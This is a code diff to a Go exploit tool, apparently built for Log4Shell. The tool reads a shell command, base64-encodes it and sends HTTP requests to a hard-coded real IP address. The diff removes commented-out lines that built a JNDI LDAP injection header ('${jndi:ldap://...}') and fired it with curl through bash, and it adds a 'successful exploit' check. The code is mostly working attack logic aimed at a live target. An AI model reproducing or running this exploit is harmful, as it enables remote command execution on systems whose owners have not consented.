@@ -11,11 +11,8 @@ import (
 	"time"
 )
 
-var (
-	payloadcmd string
-)
-
 func PayloadInput() {
+	var payloadcmd string
 	targetip := "168.138.44.152"
 	targetport := "8080"
 	sourceip, err := sysinfo.GetIP()
@@ -31,21 +28,6 @@ func PayloadInput() {
 			payloadcmd = scanner.Text()
 		}
 		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
-		// fmt.Println("Base64:", encodedpayloadcmd)
-
-		// header := "X-Api-Version: ${jndi:ldap://" + sourceip.String() + ":1389/Basic/Command/Base64/" + encodedpayloadcmd + "}"
-
-		// payload := "curl " + targetip + ":" + targetport + " -H '" + header + "'"
-		// fmt.Println("Payload:", payload)
-
-		// fmt.Println("Sending payload...")
-		// cmd := exec.Command("bash", "-c", payload)
-		// err = cmd.Run()
-		// if err != nil {
-		// 	fmt.Println("Error:", err)
-		// } else {
-		// 	fmt.Println("Payload sent.")
-		// }
 		target := "http://" + targetip + ":" + targetport
 		req, err := http.NewRequest(("GET"), target, nil)
 		if err != nil {
@@ -70,7 +52,12 @@ func PayloadInput() {
 			fmt.Println("Please try again.")
 			continue
 		}
-		fmt.Println("Response:", string(responseBody))
+		if string(responseBody) == "Hello, world!" {
+			fmt.Println("Payload sent. Expoloit successful.")
+		} else {
+			fmt.Println("Payload sent failed. Please try again.")
+			continue
+		}
 		break
 	}
 }
